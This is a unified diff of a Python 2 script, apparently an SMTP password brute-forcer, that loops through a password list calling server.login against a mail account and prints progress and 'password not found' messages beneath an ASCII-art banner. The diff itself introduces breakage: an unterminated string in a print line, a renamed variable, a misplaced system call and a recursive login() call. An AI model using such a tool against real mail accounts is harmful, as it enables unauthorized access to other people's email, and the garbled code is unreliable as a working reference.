@@ -1,4 +1,5 @@
 #!/usr/bin/python
+system('clear')
 '''create by Henry1833'''
 
 import smtplib 
@@ -25,7 +26,7 @@ def main():
    print '  __,-<_     )`-/   `./  /        '
    print '    \ `---     \   / /  /         '
    print '      |           |./  /          '
-   print '      /           //  /           '
+   print '      /           //  /        
    print '  \_/  \         |/  /            '
    print '   |    |   _,^- /  /             '
    print '   |    ,  `` (\/  /_             '
@@ -55,7 +56,7 @@ def login():
       i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
-         server.login(user_name, password)
+         server.login(username, password)
          system('clear')
          main()
          print '\n'
@@ -71,4 +72,4 @@ def login():
             break
          else:
            print '[!] password not found => ' + password
-login()
+           login()
